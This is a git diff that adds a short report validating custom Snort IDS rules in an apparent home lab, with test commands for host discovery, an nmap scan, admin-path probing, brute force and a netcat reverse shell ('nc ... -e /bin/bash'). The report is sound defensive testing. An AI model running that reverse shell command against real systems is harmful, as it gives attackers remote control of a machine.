@@ -71,7 +71,7 @@ POST attempts spaced 3 seconds apart to simulate low-and-slow evasion.
 
 ![Low and Slow Brute Force Detection](../assets/screenshots/validation/low-slow-bruteforce-detection.png)
 
-### Analyst Notes
+### Notes
 
 - Slower credential attempts designed to evade burst thresholds.
 - Extended time-window detection successfully identified behaviour.
@@ -92,3 +92,75 @@ This lab demonstrates layered detection coverage across:
 
 Detection logic was validated using controlled adversary simulation techniques.
 
+# Detection Validation Report
+
+This document validates the functionality of custom Snort IDS detection rules through simulated attack scenarios.
+
+## Test Environment
+
+| Component     | Description                    |
+|---------------|--------------------------------|
+Attacker System | Windows VM with Nmap and Ncat  |
+Target System   | Ubuntu VM running Snort IDS    |
+Network         | VirtualBox Host-Only Network   |
+Services        | Python HTTP server (port 8080) |
+
+## Detection Tests
+
+### ICMP Host Discovery
+
+Command executed: ping 192.168.1.3
+
+Result:
+
+Snort generated ICMP alert confirming host discovery detection.
+
+---
+
+### Port Scan
+
+Command executed: nmap -sS 192.168.1.3
+
+Result:
+
+Snort triggered SYN scan detection rule.
+
+---
+
+### Admin Panel Enumeration
+
+Command executed: curl http://192.168.1.3:8080/admin
+
+Result:
+
+Snort detected suspicious admin endpoint access.
+
+---
+
+### Web Brute Force
+
+Command executed:
+
+Simulated POST requests to web server.
+
+Result:
+
+Snort triggered brute force detection rule.
+
+---
+
+### Reverse Shell
+
+Command executed: nc 192.168.1.4 4444 -e /bin/bash
+
+Result:
+
+Snort detected outbound command & control connection.
+
+Example alert: SOC-LAB Reverse Shell Outbound Connection
+
+---
+
+## Conclusion
+
+All custom detection rules successfully triggered during the controlled attack simulations, demonstrating effective monitoring coverage across multiple adversary behaviours.
